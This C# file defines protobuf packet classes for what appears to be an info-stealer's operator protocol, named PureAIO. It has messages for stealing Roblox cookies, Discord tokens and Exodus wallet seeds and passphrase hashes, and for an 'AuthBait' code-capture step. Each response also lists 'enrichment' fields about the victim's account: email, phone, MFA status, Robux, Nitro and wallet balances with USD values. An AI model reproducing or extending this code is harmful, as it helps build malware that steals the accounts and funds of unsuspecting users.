using ProtoBuf;
using System.Collections.Generic;

namespace PureAIO
{
    // ── Root discriminated union ──────────────────────────────────────────────
    [ProtoContract]
    [ProtoInclude(1,  typeof(AuthBaitStartRequest))]
    [ProtoInclude(2,  typeof(AuthBaitCodeResponse))]
    [ProtoInclude(3,  typeof(RobloxCookieRequest))]
    [ProtoInclude(4,  typeof(RobloxCookieResponse))]
    [ProtoInclude(5,  typeof(DiscordTokenRequest))]
    [ProtoInclude(6,  typeof(DiscordTokenResponse))]
    [ProtoInclude(7,  typeof(ExodusRequest))]
    [ProtoInclude(8,  typeof(ExodusResponse))]
    public class AIOPacket { }

    // ── AuthBait ──────────────────────────────────────────────────────────────
    [ProtoContract]
    public class AuthBaitStartRequest : AIOPacket { }

    [ProtoContract]
    public class AuthBaitCodeResponse : AIOPacket
    {
        [ProtoMember(1)] public bool   Success { get; set; }
        [ProtoMember(2)] public string Code    { get; set; }
        [ProtoMember(3)] public string Error   { get; set; }
    }

    // ── Roblox cookie ─────────────────────────────────────────────────────────
    [ProtoContract]
    public class RobloxCookieRequest : AIOPacket { }

    [ProtoContract]
    public class RobloxCookieResponse : AIOPacket
    {
        [ProtoMember(1)] public bool             Success { get; set; }
        [ProtoMember(2)] public List<CookieEntry> Cookies { get; set; }
        [ProtoMember(3)] public string            Error   { get; set; }
    }

    [ProtoContract]
    public class CookieEntry
    {
        // Where the cookie was found
        [ProtoMember(1)] public string Source { get; set; }
        [ProtoMember(2)] public string Value  { get; set; }

        // ── Enrichment: Roblox account info ──────────────────────────────────
        [ProtoMember(3)]  public long   UserId        { get; set; }
        [ProtoMember(4)]  public string Username      { get; set; }
        [ProtoMember(5)]  public string DisplayName   { get; set; }
        [ProtoMember(6)]  public long   Robux         { get; set; }
        [ProtoMember(7)]  public bool   IsPremium     { get; set; }
        [ProtoMember(8)]  public bool   IsEmailVerified { get; set; }
        [ProtoMember(9)]  public string AccountAge    { get; set; }   // ISO date
        [ProtoMember(10)] public bool   TwoStepEnabled { get; set; }
        [ProtoMember(11)] public string Country       { get; set; }
        [ProtoMember(12)] public string EnrichError   { get; set; }   // non-null if enrich failed
    }

    // ── Discord token ─────────────────────────────────────────────────────────
    [ProtoContract]
    public class DiscordTokenRequest : AIOPacket { }

    [ProtoContract]
    public class DiscordTokenResponse : AIOPacket
    {
        [ProtoMember(1)] public bool             Success { get; set; }
        [ProtoMember(2)] public List<TokenEntry> Tokens  { get; set; }
        [ProtoMember(3)] public string           Error   { get; set; }
    }

    [ProtoContract]
    public class TokenEntry
    {
        [ProtoMember(1)] public string Source { get; set; }
        [ProtoMember(2)] public string Value  { get; set; }

        // ── Enrichment: Discord account info ─────────────────────────────────
        [ProtoMember(3)]  public string UserId          { get; set; }
        [ProtoMember(4)]  public string Username        { get; set; }
        [ProtoMember(5)]  public string GlobalName      { get; set; }   // display name
        [ProtoMember(6)]  public string Discriminator   { get; set; }   // legacy #0000
        [ProtoMember(7)]  public string Email           { get; set; }
        [ProtoMember(8)]  public bool   EmailVerified   { get; set; }
        [ProtoMember(9)]  public string Phone           { get; set; }
        [ProtoMember(10)] public bool   MfaEnabled      { get; set; }
        [ProtoMember(11)] public int    NitroType       { get; set; }   // 0=none 1=classic 2=boost 3=basic
        [ProtoMember(12)] public string NitroExpiry     { get; set; }   // ISO date or null
        [ProtoMember(13)] public int    Flags           { get; set; }   // badge bitfield
        [ProtoMember(14)] public string Locale          { get; set; }
        [ProtoMember(15)] public long   AccountCreated  { get; set; }   // unix ms derived from snowflake
        [ProtoMember(16)] public string EnrichError     { get; set; }
    }

    // ── Exodus wallet ─────────────────────────────────────────────────────────
    [ProtoContract]
    public class ExodusRequest : AIOPacket { }

    [ProtoContract]
    public class ExodusResponse : AIOPacket
    {
        [ProtoMember(1)] public bool                  Success { get; set; }
        [ProtoMember(2)] public List<ExodusDataEntry> Items   { get; set; }
        // ── Enrichment: per-asset balances parsed from wallet files ───────────
        [ProtoMember(3)] public List<ExodusBalance>   Balances { get; set; }
        [ProtoMember(4)] public string                Error   { get; set; }
    }

    [ProtoContract]
    public class ExodusDataEntry
    {
        [ProtoMember(1)] public string Kind   { get; set; }   // seed_seco, passphrase_hash, etc.
        [ProtoMember(2)] public string Wallet { get; set; }   // asset ticker / "all"
        [ProtoMember(3)] public string Value  { get; set; }   // plaintext or base64 blob
    }

    [ProtoContract]
    public class ExodusBalance
    {
        [ProtoMember(1)] public string Ticker        { get; set; }   // "BTC", "ETH", …
        [ProtoMember(2)] public string Name          { get; set; }   // "Bitcoin"
        [ProtoMember(3)] public string Balance       { get; set; }   // raw from wallet JSON
        [ProtoMember(4)] public string FiatValue     { get; set; }   // USD estimate if parseable
        [ProtoMember(5)] public string Address       { get; set; }   // first receive address
        [ProtoMember(6)] public bool   IsEnabled     { get; set; }
    }
}
